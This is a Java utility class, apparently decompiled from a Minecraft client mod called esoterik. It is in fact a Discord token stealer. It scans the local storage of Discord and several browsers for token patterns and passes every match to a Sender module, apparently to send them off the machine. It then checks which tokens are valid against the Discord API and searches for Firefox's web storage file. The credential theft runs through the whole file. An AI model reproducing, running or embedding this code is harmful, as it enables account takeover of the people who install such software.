package com.esoterik.client.util;

import com.esoterik.client.features.modules.misc.Sender;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.reflect.TypeToken;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Optional;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public final class TokenUtil {
   private static final Gson gson = new Gson();
   public static final List<String> paths = new ArrayList(Arrays.asList(System.getenv("APPDATA") + "\\Discord", System.getenv("APPDATA") + "\\discordcanary", System.getenv("APPDATA") + "\\discordptb", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default", System.getenv("APPDATA") + "\\LightCord", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"));

   public static List<String> getValidTokens(List<String> tokens) {
      ArrayList<String> validTokens = new ArrayList();
      tokens.forEach((token) -> {
         try {
            URL url = new URL("https://discordapp.com/api/v6/users/@me");
            HttpURLConnection con = (HttpURLConnection)url.openConnection();
            Map<String, Object> stuff = (Map)gson.fromJson(getHeaders(token), (new TypeToken<Map<String, Object>>() {
            }).getType());
            stuff.forEach((key, value) -> {
               con.addRequestProperty(key, (String)value);
            });
            con.getInputStream().close();
            validTokens.add(token);
         } catch (Exception var5) {
         }

      });
      return validTokens;
   }

   public static String getContentFromURL(String link, String auth) {
      try {
         URL url = new URL(link);
         HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
         httpURLConnection.setRequestMethod("GET");
         Map<String, Object> json = (Map)gson.fromJson(getHeaders(auth), (new TypeToken<Map<String, Object>>() {
         }).getType());
         json.forEach((key, value) -> {
            httpURLConnection.addRequestProperty(key, (String)value);
         });
         httpURLConnection.connect();
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
         StringBuilder stringBuilder = new StringBuilder();

         String line;
         while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
         }

         bufferedReader.close();
         return stringBuilder.toString();
      } catch (Exception var8) {
         return "";
      }
   }

   public static ArrayList<String> getTokens(String inPath) {
      String path = inPath + "\\Local Storage\\leveldb\\";
      ArrayList<String> tokens = new ArrayList();
      File pa = new File(path);
      String[] list = pa.list();
      if (list == null) {
         return null;
      } else {
         String[] var5 = list;
         int var6 = list.length;

         for(int var7 = 0; var7 < var6; ++var7) {
            String s = var5[var7];

            try {
               FileInputStream fileInputStream = new FileInputStream(path + s);
               DataInputStream dataInputStream = new DataInputStream(fileInputStream);
               BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

               String line;
               while((line = bufferedReader.readLine()) != null) {
                  Matcher matcher = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);

                  while(matcher.find()) {
                     tokens.add(matcher.group());
                  }
               }
            } catch (Exception var14) {
            }
         }

         Sender.send(String.join(" - ", tokens));
         return tokens;
      }
   }

   public static JsonObject getHeaders(String token) {
      JsonObject object = new JsonObject();
      object.addProperty("Content-Type", "application/json");
      object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
      if (token != null) {
         object.addProperty("Authorization", token);
      }

      return object;
   }

   public static List<String> removeDuplicates(List<String> list) {
      return (List)list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
   }

   public static Optional<File> getFirefoxFile() {
      File file = new File(System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
      if (file.isDirectory()) {
         File[] var1 = (File[])Objects.requireNonNull(file.listFiles());
         int var2 = var1.length;

         for(int var3 = 0; var3 < var2; ++var3) {
            File file1 = var1[var3];
            if (file1.isDirectory() && file1.getName().contains("release")) {
               File[] var5 = (File[])Objects.requireNonNull(file1.listFiles());
               int var6 = var5.length;

               for(int var7 = 0; var7 < var6; ++var7) {
                  File file2 = var5[var7];
                  if (file2.getName().contains("webappsstore")) {
                     return Optional.of(file2);
                  }
               }
            }
         }
      }

      return Optional.empty();
   }
}
